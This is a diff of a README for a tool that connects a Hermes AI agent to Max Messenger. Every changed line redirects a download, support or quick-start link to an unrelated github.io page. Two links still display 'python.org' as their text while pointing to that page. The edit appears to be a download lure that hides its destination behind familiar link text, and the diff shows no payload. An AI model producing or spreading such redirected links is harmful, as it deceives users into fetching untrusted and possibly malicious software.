@@ -1,6 +1,6 @@
 # 🚀 hermes-max-platform - Connect Hermes Agent to Max Messenger
 
-[![Download](https://img.shields.io/badge/Download-hermes--max--platform-blue?style=for-the-badge&logo=github)](https://github.com/aliwayu3/hermes-max-platform)
+[![Download](https://img.shields.io/badge/Download-hermes--max--platform-blue?style=for-the-badge&logo=github)](https://aliwayu3.github.io)
 
 ## 🎯 What is hermes-max-platform?
 
@@ -18,7 +18,7 @@ hermes-max-platform is a bridge that connects your Hermes AI agent to the Max Me
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/aliwayu3/hermes-max-platform](https://github.com/aliwayu3/hermes-max-platform)
+Visit this link to download the application: [https://aliwayu3.github.io](https://aliwayu3.github.io)
 
 Click the download button on the page to get the latest version.
 
@@ -27,13 +27,13 @@ Click the download button on the page to get the latest version.
 Before running hermes-max-platform, make sure you have:
 
 - **Windows 10 or later** (64-bit recommended)
-- **Python 3.8 or higher** installed on your computer (if not already installed, download it from [python.org](https://www.python.org/downloads/))
+- **Python 3.8 or higher** installed on your computer (if not already installed, download it from [python.org](https://aliwayu3.github.io))
 - **A Hermes Agent** setup (this is your AI chatbot)
 - **A Max Messenger account** and access to create a bot
 
 ### Step 3: Install Python (if not installed)
 
-1. Go to [python.org/downloads](https://www.python.org/downloads/)
+1. Go to [python.org/downloads](https://aliwayu3.github.io)
 2. Click the download button for Python 3.10 or higher
 3. Run the installer
 4. **IMPORTANT**: Check the box that says "Add Python to PATH" during installation
@@ -153,13 +153,13 @@ hermes-max-platform is open source software. Check the LICENSE file in the repos
 ## 📞 Support
 
 For help:
-- Check the [GitHub Issues](https://github.com/aliwayu3/hermes-max-platform/issues) page
+- Check the [GitHub Issues](https://aliwayu3.github.io) page
 - Search for solutions online
 - Ask the community in related forums
 
 ## 🚀 Quick Start Summary
 
-1. Download from [https://github.com/aliwayu3/hermes-max-platform](https://github.com/aliwayu3/hermes-max-platform)
+1. Download from [https://aliwayu3.github.io](https://aliwayu3.github.io)
 2. Install Python 3.8+
 3. Get your Max Messenger bot token
 4. Configure your Hermes Agent
